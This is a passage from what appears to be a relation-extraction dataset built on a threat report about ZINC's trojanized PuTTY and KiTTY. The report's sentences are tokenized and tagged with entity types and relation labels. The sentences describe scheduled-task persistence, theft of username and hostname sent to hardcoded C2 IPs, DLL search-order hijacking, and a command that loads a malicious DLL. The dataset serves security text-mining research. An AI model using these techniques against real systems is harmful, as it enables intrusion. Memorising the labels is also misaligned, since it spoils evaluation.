5, 6], "h": 9, "t": 15}, {"r": "RF", "evidence": [3, 4, 5, 6], "h": 9, "t": 15}, {"r": "ST", "evidence": [4, 5, 6], "h": 10, "t": 15}, {"r": "RF", "evidence": [4, 5, 6], "h": 10, "t": 15}, {"r": "CO", "evidence": [2, 3, 4], "t": 8, "h": 10}, {"r": "RD", "evidence": [5], "h": 11, "t": 12}, {"r": "RD", "evidence": [5], "h": 11, "t": 13}, {"r": "CO", "evidence": [5, 6], "h": 11, "t": 14}, {"r": "ST", "evidence": [6], "h": 14, "t": 15}, {"r": "ST", "evidence": [7], "t": 16, "h": 17}, {"r": "RF", "evidence": [7], "t": 16, "h": 17}, {"r": "WR", "evidence": [7], "h": 17, "t": 18}]}, {"title": "052-11", "sents": [["Upon", "successful", "connection", "to", "the", "C2", "server", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "compromised", "device", "for", "other", "tasks", "."], ["Lastly", ",", "persistence", "is", "established", "with", "the", "creation", "of", "a", "daily", "scheduled", "task", ",", "PackageColor", ",", "as", "part", "of", "the", "configuration", "for", "the", "weaponized", "PuTTY", "."], ["ZINC", "accomplishes", "this", "with", "the", "following", "command", ":"], ["PuTTY", "scheduled", "task", "as", "part", "of", "persistence"], ["The", "executable", "first", "collects", "the", "username", "and", "hostname", "of", "the", "victim", "system", "."], ["It", "then", "sends", "that", "information", "to", "a", "hardcoded", "IP", "172.93.201.253", "over", "TCP/22", ",", "which", "does", "not", "use", "SSH", "protocol", "and", "does", "not", "require", "SSH", "handshake", "to", "establish", "communication", "."], ["Upon", "successful", "TCP", "connection", "to", "the", "server", "at", "137.184.15.189", ",", "the", "malicious", "KiTTY", "executable", "then", "deploys", "the", "malware", "as", "%", "AppData", "%", "\\mscoree.dll", "following", "multiple", "rounds", "of", "decoding", "."], ["The", "mscoree.dll", "file", "is", "the", "embedded", "payload", ",", "detected", "as", "EventHorizon", ",", "in", "the", "ZetaNile", "malware", "family", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [5, 5], "name": "C2 server", "pos": [5, 7], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "attackers", "pos": [9, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "malware", "pos": [13, 14], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [36, 36], "name": "PackageColor", "pos": [14, 15], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [45, 45], "name": "weaponized PuTTY", "pos": [23, 25], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [48, 48], "name": "ZINC", "pos": [0, 1], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [56, 56], "name": "PuTTY", "pos": [0, 1], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [64, 64], "name": "executable", "pos": [1, 2], "index": "7_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [68, 68], "name": "username", "pos": [5, 6], "index": "8_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [70, 70], "name": "hostname", "pos": [7, 8], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [76, 76], "name": "It", "pos": [0, 1], "index": "10_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [85, 85], "name": "172.93.201.253", "pos": [9, 10], "index": "11_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [113, 113], "name": "137.184.15.189", "pos": [8, 9], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [117, 117], "name": "KiTTY executable", "pos": [12, 14], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [124, 124], "name": "% AppData % \\mscoree.dll", "pos": [19, 23], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [135, 135], "name": "mscoree.dll", "pos": [1, 2], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [144, 144], "name": "EventHorizon", "pos": [10, 11], "index": "16_0"}]], "labels": [{"r": "ST", "evidence": [0], "t": 0, "h": 1}, {"r": "RF", "evidence": [0], "t": 0, "h": 1}, {"r": "FR", "evidence": [0], "h": 1, "t": 2}, {"r": "FR", "evidence": [1], "t": 3, "h": 4}, {"r": "FR", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "ST", "evidence": [2, 3, 4, 5], "h": 5, "t": 11}, {"r": "RF", "evidence": [2, 3, 4, 5], "h": 5, "t": 11}, {"r": "ST", "evidence": [3, 4, 5], "h": 6, "t": 11}, {"r": "RF", "evidence": [3, 4, 5], "h": 6, "t": 11}, {"r": "CO", "evidence": [1, 2, 3], "t": 4, "h": 6}, {"r": "RD", "evidence": [4], "h": 7, "t": 8}, {"r": "RD", "evidence": [4], "h": 7, "t": 9}, {"r": "CO", "evidence": [4, 5], "h": 7, "t": 10}, {"r": "ST", "evidence": [5], "h": 10, "t": 11}, {"r": "ST", "evidence": [6], "t": 12, "h": 13}, {"r": "RF", "evidence": [6], "t": 12, "h": 13}, {"r": "WR", "evidence": [6], "h": 13, "t": 14}, {"r": "WR", "evidence": [7], "t": 15, "h": 16}, {"r": "WR", "evidence": [7], "t": 15, "h": 16}, {"r": "CO", "evidence": [6, 7], "t": 14, "h": 15}]}, {"title": "052-12", "sents": [["Lastly", ",", "persistence", "is", "established", "with", "the", "creation", "of", "a", "daily", "scheduled", "task", ",", "PackageColor", ",", "as", "part", "of", "the", "configuration", "for", "the", "weaponized", "PuTTY", "."], ["ZINC", "accomplishes", "this", "with", "the", "following", "command", ":"], ["PuTTY", "scheduled", "task", "as", "part", "of", "persistence"], ["The", "executable", "first", "collects", "the", "username", "and", "hostname", "of", "the", "victim", "system", "."], ["It", "then", "sends", "that", "information", "to", "a", "hardcoded", "IP", "172.93.201.253", "over", "TCP/22", ",", "which", "does", "not", "use", "SSH", "protocol", "and", "does", "not", "require", "SSH", "handshake", "to", "establish", "communication", "."], ["Upon", "successful", "TCP", "connection", "to", "the", "server", "at", "137.184.15.189", ",", "the", "malicious", "KiTTY", "executable", "then", "deploys", "the", "malware", "as", "%", "AppData", "%", "\\mscoree.dll", "following", "multiple", "rounds", "of", "decoding", "."], ["The", "mscoree.dll", "file", "is", "the", "embedded", "payload", ",", "detected", "as", "EventHorizon", ",", "in", "the", "ZetaNile", "malware", "family", "."], ["Similar", "to", "ZINC", "'", "s", "version", "of", "PuTTY", ",", "the", "actor", "uses", "DLL", "search", "order", "hijacking", "to", "load", "malicious", "DLL", "files", "that", "perform", "tasks", "within", "the", "context", "of", "these", "legitimate", "Windows", "processes", ",", "specifically", "through", "%", "AppData", "%", "KiTTY", "%", "PresentationHost.exe", "-EmbeddingObject", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [14, 14], "name": "PackageColor", "pos": [14, 15], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [23, 23], "name": "weaponized PuTTY", "pos": [23, 25], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "ZINC", "pos": [0, 1], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [34, 34], "name": "PuTTY", "pos": [0, 1], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [42, 42], "name": "executable", "pos": [1, 2], "index": "4_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [46, 46], "name": "username", "pos": [5, 6], "index": "5_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [48, 48], "name": "hostname", "pos": [7, 8], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [54, 54], "name": "It", "pos": [0, 1], "index": "7_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [63, 63], "name": "172.93.201.253", "pos": [9, 10], "index": "8_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [91, 91], "name": "137.184.15.189", "pos": [8, 9], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [95, 95], "name": "KiTTY executable", "pos": [12, 14], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [102, 102], "name": "% AppData % \\mscoree.dll", "pos": [19, 23], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [113, 113], "name": "mscoree.dll", "pos": [1, 2], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [122, 122], "name": "EventHorizon", "pos": [10, 11], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [132, 132], "name": "ZINC", "pos": [2, 3], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [137, 137], "name": "PuTTY", "pos": [7, 8], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [142, 142], "name": "DLL search order hijacking", "pos": [12, 16], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [149, 149], "name": "DLL files", "pos": [19, 21], "index": "17_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [160, 160], "name": "Windows processes", "pos": [30, 32], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [165, 165], "name": "% AppData % KiTTY % PresentationHost.exe", "pos": [35, 41], "index": "19_0"}]], "labels": [{"r": "FR", "evidence": [0], "t": 0, "h": 1}, {"r": "FR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "ST", "evidence": [1, 2, 3, 4], "h": 2, "t": 8}, {"r": "RF", "evidence": [1, 2, 3, 4], "h": 2, "t": 8}, {"r": "ST", "evidence": [2, 3, 4], "h": 3, "t": 8}, {"r": "RF", "evidence": [2, 3, 4], "h": 3, "t": 8}, {"r": "CO", "evidence": [0, 1, 2], "t": 1, "h": 3}, {"r": "RD", "evidence": [3], "h": 4, "t": 5}, {"r": "RD", "evidence": [3], "h": 4, "t": 6}, {"r": "CO", "evidence": [3, 4], "h": 4, "t": 7}, {"r": "ST", "evidence": [4], "h": 7, "t": 8}, {"r": "ST", "evidence": [5], "t": 9, "h": 10}, {"r": "RF", "evidence": [5], "t": 9, "h": 10}, {"r": "WR", "evidence": [5], "h": 10, "t": 11}, {"r": "WR", "evidence": [6], "t": 12, "h": 13}, {"r": "WR", "evidence": [6], "t": 12, "h": 13}, {"r": "FR", "evidence": [6, 7], "h": 13, "t": 18}, {"r": "CO", "evidence": [5, 6], "t": 11, "h": 12}, {"r": "WR", "evidence": [7], "h": 16, "t": 17}, {"r": "WR", "evidence": [6, 7], "t": 12, "h": 14}, {"r": "WR", "evidence": [6, 7], "t": 12, "h": 15}, {"r": "EX", "evidence": [7], "t": 17, "h": 18}, {"r": "EX", "evidence": [7], "h": 18, "t": 19}]}, {"title": "052-13", "sents": [["ZINC", "accomplishes", "this", "with", "the", "following", "command", ":"], ["PuTTY", "scheduled", "task", "as", "part", "of", "persistence"], ["The", "executable", "first", "collects", "the", "username", "and", "hostname", "of", "the", "victim", "system", "."], ["It", "then", "sends", "that", "information", "to", "a", "hardcoded", "IP", "172.93.201.253", "over", "TCP/22", ",", "which", "does", "not", "use", "SSH", "protocol", "and", "does", "not", "require", "SSH", "handshake", "to", "establish", "communication", "."], ["Upon", "successful", "TCP", "connection", "to", "the", "server", "at", "137.184.15.189", ",", "the", "malicious", "KiTTY", "executable", "then", "deploys", "the", "malware", "as", "%", "AppData", "%", "\\mscoree.dll", "following", "multiple", "rounds", "of", "decoding", "."], ["The", "mscoree.dll", "file", "is", "the", "embedded", "payload", ",", "detected", "as", "EventHorizon", ",", "in", "the", "ZetaNile", "malware", "family", "."], ["Similar", "to", "ZINC", "'", "s", "version", "of", "PuTTY", ",", "the", "actor", "uses", "DLL", "search", "order", "hijacking", "to", "load", "malicious", "DLL", "files", "that", "perform", "tasks", "within", "the", "context", "of", "these", "legitimate", "Windows", "processes", ",", "specifically", "through", "%", "AppData", "%", "KiTTY", "%", "PresentationHost.exe", "-EmbeddingObject", "."], ["Screenshot", "of", "Windows", "process", "that", "ZINC", "hijacks", "through", "DLL", "search", "order", "hijacking"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "ZINC", "pos": [0, 1], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [8, 8], "name": "PuTTY", "pos": [0, 1], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [16, 16], "name": "executable", "pos": [1, 2], "index": "2_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [20, 20], "name": "username", "pos": [5, 6], "index": "3_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [22, 22], "name": "hostname", "pos": [7, 8], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [28, 28], "name": "It", "pos": [0, 1], "index": "5_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [37, 37], "name": "172.93.201.253", "pos": [9, 10], "index": "6_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [65, 65], "name": "137.184.15.189", "pos": [8, 9], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [69, 69], "name": "KiTTY executable", "pos": [12, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [76, 76], "name": "% AppData % \\mscoree.dll", "pos": [19, 23], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [87, 87], "name": "mscoree.dll", "pos": [1, 2], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [96, 96], "name": "EventHorizon", "pos": [10, 11], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [106, 106], "name": "ZINC", "pos": [2, 3], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [111, 111], "name": "PuTTY", "pos": [7, 8], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [116, 116], "name": "DLL search order hijacking", "pos": [12, 16], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [123, 123], "name": "DLL files", "pos": [19, 21], "index": "15_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [134, 134], "name": "Windows processes", "pos": [30, 32], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [139, 139], "name": "% AppData % KiTTY % PresentationHost.exe", "pos": [35, 41], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [149, 149], "name": "Windows process", "pos": [2, 4], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [152, 152], "name": "ZINC", "pos": [5, 6], "index": "19_0"}]], "labels": [{"r": "ST", "evidence": [0, 1, 2, 3], "h": 0, "t": 6}, {"r": "RF", "evidence": [0, 1, 2, 3], "h": 0, "t": 6}, {"r": "ST", "evidence": [1, 2, 3], "h": 1, "t": 6}, {"r": "RF", "evidence": [1, 2, 3], "h": 1, "t": 6}, {"r": "RD", "evidence": [2], "h": 2, "t": 3}, {"r": "RD", "evidence": [2], "h": 2, "t": 4}, {"r": "CO", "evidence": [2, 3], "h": 2, "t": 5}, {"r": "ST", "evidence": [3], "h": 5, "t": 6}, {"r": "ST", "evidence": [4], "t": 7, "h": 8}, {"r": "RF", "evidence": [4], "t": 7, "h": 8}, {"r": "WR", "evidence": [4], "h": 8, "t": 9}, {"r": "WR", "evidence": [5], "t": 10, "h": 11}, {"r": "WR", "evidence": [5], "t": 10, "h": 11}, {"r": "FR", "evidence": [5, 6], "h": 11, "t": 16}, {"r": "CO", "evidence": [4, 5], "t": 9, "h": 10}, {"r": "WR", "evidence": [6], "h": 14, "t": 15}, {"r": "WR", "evidence": [5, 6], "t": 10, "h": 12}, {"r": "WR", "evidence": [5, 6], "t": 10, "h": 13}, {"r": "EX", "evidence": [6], "t": 15, "h": 16}, {"r": "EX", "evidence": [6], "h": 16, "t": 17}, {"r": "RD", "evidence": [6, 7], "t": 17, "h": 18}, {"r": "RD", "evidence": [6, 7], "t": 17, "h": 19}]}, {"title": "052-14", "sents": [["PuTTY", "scheduled", "task", "as", "part", "of", "persistence"], ["The", "executable", "first", "collects", "the", "username", "and", "hostname", "of", "the", "victim", "system", "."], ["It", "then", "sends", "that", "information", "to", "a", "hardcoded", "IP", "172.93.201.253", "over", "TCP/22", ",", "which", "does", "not", "use", "SSH", "protocol", "and", "does", "not", "require", "SSH", "handshake", "to", "establish", "communication", "."], ["Upon", "successful", "TCP", "connection", "to", "the", "server", "at", "137.184.15.189", ",", "the", "malicious", "KiTTY", "executable", "then", "deploys", "the", "malware", "as", "%", "AppData", "%", "\\mscoree.dll", "following", "multiple", "rounds", "of", "decoding", "."], ["The", "mscoree.dll", "file", "is", "the", "embedded", "payload", ",", "detected", "as", "EventHorizon", ",", "in", "the", "ZetaNile", "malware", "family", "."], ["Similar", "to", "ZINC", "'", "s", "version", "of", "PuTTY", ",", "the", "actor", "uses", "DLL", "search", "order", "hijacking", "to", "load", "malicious", "DLL", "files", "that", "perform", "tasks", "within", "the", "context", "of", "these", "legitimate", "Windows", "processes", ",", "specifically", "through", "%", "AppData", "%", "KiTTY", "%", "PresentationHost.exe", "-EmbeddingObject", "."], ["Screenshot", "of", "Windows", "process", "that", "ZINC", "hijacks", "through", "DLL", "search", "order", "hijacking"], ["The", "mscoree.dll", "malware", "is", "modularized", "in", "such", "a", "way", "that", ",", "upon", "successful", "connection", "to", "the", "compromised", "C2", "domain", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "target", "system", "as", "needed", "using", "the", "existing", "C2", "communication", ",", "such", "as", "executing", "C", ":", "\\ProgramData\\Cisco\\fixmapi.exe", "-s", "AudioEndpointBuilder", "to", "load", "malicious", "mapistub.dll", "from", "the", "compromised", "C2", "server", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "PuTTY", "pos": [0, 1], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [8, 8], "name": "executable", "pos": [1, 2], "index": "1_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [12, 12], "name": "username", "pos": [5, 6], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [14, 14], "name": "hostname", "pos": [7, 8], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [20, 20], "name": "It", "pos": [0, 1], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [29, 29], "name": "172.93.201.253", "pos": [9, 10], "index": "5_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [57, 57], "name": "137.184.15.189", "pos": [8, 9], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [61, 61], "name": "KiTTY executable", "pos": [12, 14], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [68, 68], "name": "% AppData % \\mscoree.dll", "pos": [19, 23], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [79, 79], "name": "mscoree.dll", "pos": [1, 2], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [88, 88], "name": "EventHorizon", "pos": [10, 11], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [98, 98], "name": "ZINC", "pos": [2, 3], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [103, 103], "name": "PuTTY", "pos": [7, 8], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [108, 108], "name": "DLL search order hijacking", "pos": [12, 16], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [115, 115], "name": "DLL files", "pos": [19, 21], "index": "14_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [126, 126], "name": "Windows processes", "pos": [30, 32], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [131, 131], "name": "% AppData % KiTTY % PresentationHost.exe", "pos": [35, 41], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [141, 141], "name": "Windows process", "pos": [2, 4], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [144, 144], "name": "ZINC", "pos": [5, 6], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [152, 152], "name": "mscoree.dll malware", "pos": [1, 3], "index": "19_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [168, 168], "name": "C2 domain", "pos": [17, 19], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [172, 172], "name": "attackers", "pos": [21, 22], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [176, 176], "name": "malware", "pos": [25, 26], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [192, 192], "name": "C : \\ProgramData\\Cisco\\fixmapi.exe", "pos": [41, 44], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [200, 200], "name": "mapistub.dll", "pos": [49, 50], "index": "24_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [204, 204], "name": "C2 server", "pos": [53, 55], "index": "25_0"}]], "labels": [{"r": "ST", "evidence": [0, 1, 2], "h": 0, "t": 5}, {"r": "RF", "evidence": [0, 1, 2], "h": 0, "t": 5}, {"r": "RD", "evidence": [1], "h": 1, "t": 2}, {"r": "RD", "evidence": [1], "h": 1, "t": 3}, {"r": "CO", "evidence": [1, 2], "h": 1, "t": 4}, {"r": "ST", "evidence": [2], "h": 4, "t": 5}, {"r": "ST", "evidence": [3], "t": 6, "h": 7}, {"r": "RF", "evidence": [3], "t": 6, "h": 7}, {"r": "WR", "evidence": [3], "h": 7, "t": 8}, {"r": "WR", "evidence": [4], "t": 9, "h": 10}, {"r": "WR", "evidence": [4], "t": 9, "h": 10}, {"r": "FR", "evidence": [4, 5], "h": 10, "t": 15}, {"r": "CO", "evidence": [3, 4], "t": 8, "h": 9}, {"r": "WR", "evidence": [5], "h": 13, "t": 14}, {"r": "WR", "evidence": [4, 5], "t": 9, "h": 11}, {"r": "WR", "evidence": [4, 5], "t": 9, "h": 12}, {"r": "EX", "evidence": [5], "t": 14, "h": 15}, {"r": "EX", "evidence": [5], "h": 15, "t": 16}, {"r": "RD", "evidence": [5, 6], "t": 16, "h": 17}, {"r": "ST", "evidence": [6, 7], "h": 17, "t": 20}, {"r": "RF", "evidence": [6, 7], "h": 17, "t": 20}, {"r": "RD", "evidence": [5, 6], "t": 16, "h": 18}, {"r": "ST", "evidence": [6, 7], "h": 18, "t": 20}, {"r": "RF", "evidence": [6, 7], "h": 18, "t": 20}, {"r": "ST", "evidence": [7], "h": 19, "t": 20}, {"r": "RF", "evidence": [7], "h": 19, "t": 20}, {"r": "FR", "evidence": [7], "h": 21, "t": 22}, {"r": "EX", "evidence": [7], "h": 22, "t": 23}, {"r": "RD", "evidence": [7], "h": 22, "t": 24}, {"r": "RF", "evidence": [7], "h": 22, "t": 25}]}, {"title": "052-15", "sents": [["The", "executable", "first", "collects", "the", "username", "and", "hostname", "of", "the", "victim", "system", "."], ["It", "then", "sends", "that", "information", "to", "a", "hardcoded", "IP", "172.93.201.253", "over", "TCP/22", ",", "which", "does", "not", "use", "SSH", "protocol", "and", "does", "not", "require", "SSH", "handshake", "to", "establish", "communication", "."], ["Upon", "successful", "TCP", "connection", "to", "the", "server", "at", "137.184.15.189", ",", "the", "malicious", "KiTTY", "executable", "then", "deploys", "the", "malware", "as", "%", "AppData", "%", "\\mscoree.dll", "following", "multiple", "rounds", "of", "decoding", "."], ["The", "mscoree.dll", "file", "is", "the", "embedded", "payload", ",", "detected", "as", "EventHorizon", ",", "in", "the", "ZetaNile", "malware", "family", "."], ["Similar", "to", "ZINC", "'", "s", "version", "of", "PuTTY", ",", "the", "actor", "uses", "DLL", "search", "order", "hijacking", "to", "load", "malicious", "DLL", "files", "that", "perform", "tasks", "within", "the", "context", "of", "these", "legitimate", "Windows", "processes", ",", "specifically", "through", "%", "AppData", "%", "KiTTY", "%", "PresentationHost.exe", "-EmbeddingObject", "."], ["Screenshot", "of", "Windows", "process", "that", "ZINC", "hijacks", "through", "DLL", "search", "order", "hijacking"], ["The", "mscoree.dll", "malware", "is", "modularized", "in", "such", "a", "way", "that", ",", "upon", "successful", "connection", "to", "the", "compromised", "C2", "domain", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "target", "system", "as", "needed", "using", "the", "existing", "C2", "communication", ",", "such", "as", "executing", "C", ":", "\\ProgramData\\Cisco\\fixmapi.exe", "-s", "AudioEndpointBuilder", "to", "load", "malicious", "mapistub.dll", "from", "the", "compromised", "C2", "server", "."], ["The", "HTTP", "POST", "requests", "contain", "the", "hardcoded", "user", "agent", "string", "with", "misspelled", "``", "Edge", "''", ",", "as", "detailed", "below", ",", "and", "contain", "a", "unique", "ID", "for", "the", "field", "gametype", "and", "the", "hardcoded", "value", "for", "the", "field", "type", "for", "malware", "campaign", "tracking", "purposes", ":"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "executable", "pos": [1, 2], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [5, 5], "name": "username", "pos": [5, 6], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [7, 7], "name": "hostname", "pos": [7, 8], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [13, 13], "name": "It", "pos": [0, 1], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [22, 22], "name": "172.93.201.253", "pos": [9, 10], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [50, 50], "name": "137.184.15.189", "pos": [8, 9], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [54, 54], "name": "KiTTY executable", "pos": [12, 14], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [61, 61], "name": "% AppData % \\mscoree.dll", "pos": [19, 23], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [72, 72], "name": "mscoree.dll", "pos": [1, 2], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [81, 81], "name": "EventHorizon", "pos": [10, 11], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [91, 91], "name": "ZINC", "pos": [2, 3], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [96, 96], "name": "PuTTY", "pos": [7, 8], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [101, 101], "name": "DLL search order hijacking", "pos": [12, 16], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [108, 108], "name": "DLL files", "pos": [19, 21], "index": "13_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [119, 119], "name": "Windows processes", "pos": [30, 32], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [124, 124], "name": "% AppData % KiTTY % PresentationHost.exe", "pos": [35, 41], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [134, 134], "name": "Windows process", "pos": [2, 4], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [137, 137], "name": "ZINC", "pos": [5, 6], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [145, 145], "name": "mscoree.dll malware", "pos": [1, 3], "index": "18_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [161, 161], "name": "C2 domain", "pos": [17, 19], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [165, 165], "name": "attackers", "pos": [21, 22], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [169, 169], "name": "malware", "pos": [25, 26], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [185, 185], "name": "C : \\ProgramData\\Cisco\\fixmapi.exe", "pos": [41, 44], "index": "22_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [193, 193], "name": "mapistub.dll", "pos": [49, 50], "index": "23_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [197, 197], "name": "C2 server", "pos": [53, 55], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [201, 201], "name": "HTTP POST requests", "pos": [1, 4], "index": "25_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [227, 227], "name": "field gametype", "pos": [27, 29], "index": "26_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [231, 231], "name": "hardcoded value", "pos": [31, 33], "index": "27_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "ST", "evidence": [1], "h": 3, "t": 4}, {"r": "ST", "evidence": [2], "t": 5, "h": 6}, {"r": "RF", "evidence": [2], "t": 5, "h": 6}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "WR", "evidence": [3], "t": 8, "h": 9}, {"r": "WR", "evidence": [3], "t": 8, "h": 9}, {"r": "FR", "evidence": [3, 4], "h": 9, "t": 14}, {"r": "CO", "evidence": [2, 3], "t": 7, "h": 8}, {"r": "WR", "evidence": [4], "h": 12, "t": 13}, {"r": "WR", "evidence": [3, 4], "t": 8, "h": 10}, {"r": "WR", "evidence": [3, 4], "t": 8, "h": 11}, {"r": "EX", "evidence": [4], "t": 13, "h": 14}, {"r": "EX", "evidence": [4], "h": 14, "t": 15}, {"r": "RD", "evidence": [4, 5], "t": 15, "h": 16}, {"r": "ST", "evidence": [5, 6], "h": 16, "t": 19}, {"r": "RF", "evidence": [5, 6], "h": 16, "t": 19}, {"r": "RD", "evidence": [4, 5], "t": 15, "h": 17}, {"r": "ST", "evidence": [5, 6], "h": 17, "t": 19}, {"r": "RF", "evidence": [5, 6], "h": 17, "t": 19}, {"r": "ST", "evidence": [6], "h": 18, "t": 19}, {"r": "RF", "evidence": [6], "h": 18, "t": 19}, {"r": "FR", "evidence": [6], "h": 20, "t": 21}, {"r": "EX", "evidence": [6], "h": 21, "t": 22}, {"r": "RD", "evidence": [6], "h": 21, "t": 23}, {"r": "RF", "evidence": [6], "h": 21, "t": 24}, {"r": "WR", "evidence": [6, 7], "h": 21, "t": 25}]}, {"title": "052-16", 